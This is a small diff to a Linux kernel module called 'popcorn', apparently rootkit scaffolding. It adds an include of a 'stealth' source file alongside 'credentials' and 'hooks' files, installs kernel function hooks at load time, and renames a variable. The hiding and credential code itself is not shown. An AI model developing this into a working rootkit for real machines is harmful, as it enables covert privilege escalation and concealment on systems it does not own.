@@ -12,6 +12,7 @@ MODULE_VERSION("0.01");
 
 #include "src/credentials.c"
 #include "src/hooks.c"
+#include "src/stealth.c"
 
 #if !defined(CONFIG_X86_64) || (LINUX_VERSION_CODE < KERNEL_VERSION(4,17,0))
 #define VERSION_NOT_SUPPORTED
@@ -23,14 +24,14 @@ static void __exit popcorn_exit(void) {
 }
 
 static int __init popcorn_init(void) {
-    int err;
+    int error;
     #ifdef VERSION_NOT_SUPPORTED
         printk(KERN_INFO "Kernels left unpopped...\n");
         return -1;
     #endif
-    err = fh_install_hooks(kernel_hooks, ARRAY_SIZE(kernel_hooks));
-    if (err)
-        return err;
+    error = fh_install_hooks(kernel_hooks, ARRAY_SIZE(kernel_hooks));
+    if (error)
+        return error;
     printk(KERN_INFO "Popcorns have kernels!\n");
 	return 0;
 }
